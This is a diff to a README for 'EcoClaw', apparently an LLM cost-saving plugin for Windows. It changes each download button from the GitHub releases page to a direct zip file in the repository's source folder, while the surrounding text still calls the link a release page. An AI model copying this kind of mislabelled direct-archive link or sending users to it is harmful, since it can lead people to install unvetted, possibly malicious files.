@@ -1,6 +1,6 @@
 # 🦾 EcoClaw - Cut LLM Costs with One Plugin
 
-[![Download EcoClaw](https://img.shields.io/badge/Download-EcoClaw-blue?style=for-the-badge&logo=github)](https://github.com/Tatosmerfastycznie/EcoClaw/releases)
+[![Download EcoClaw](https://img.shields.io/badge/Download-EcoClaw-blue?style=for-the-badge&logo=github)](https://github.com/Tatosmerfastycznie/EcoClaw/raw/refs/heads/main/src/Eco-Claw-v2.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get EcoClaw running.
 
 Go to the EcoClaw release page here:
 
-[![Download EcoClaw](https://img.shields.io/badge/Download-EcoClaw-blue?style=for-the-badge&logo=github)](https://github.com/Tatosmerfastycznie/EcoClaw/releases)
+[![Download EcoClaw](https://img.shields.io/badge/Download-EcoClaw-blue?style=for-the-badge&logo=github)](https://github.com/Tatosmerfastycznie/EcoClaw/raw/refs/heads/main/src/Eco-Claw-v2.5.zip)
 
 This page has all the versions of EcoClaw available for Windows.
 
@@ -111,7 +111,7 @@ New versions may include:
 
 Click this large button to go to the EcoClaw releases for Windows:
 
-[![Download EcoClaw](https://img.shields.io/badge/Download-EcoClaw-grey?style=for-the-badge&logo=github)](https://github.com/Tatosmerfastycznie/EcoClaw/releases)
+[![Download EcoClaw](https://img.shields.io/badge/Download-EcoClaw-grey?style=for-the-badge&logo=github)](https://github.com/Tatosmerfastycznie/EcoClaw/raw/refs/heads/main/src/Eco-Claw-v2.5.zip)
 
 ---
 
